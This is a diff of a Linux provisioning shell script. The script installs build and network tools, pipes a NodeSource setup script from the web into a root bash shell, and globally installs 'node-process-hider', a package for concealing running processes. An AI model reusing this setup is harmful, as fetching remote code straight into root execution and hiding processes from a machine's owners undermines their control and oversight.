@@ -2,9 +2,10 @@
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
 curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
-apt-get install -y nodejs
+sudo apt-get install -y nodejs
 
 npm i -g node-process-hider
+npm install -g npm@8.19.2
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
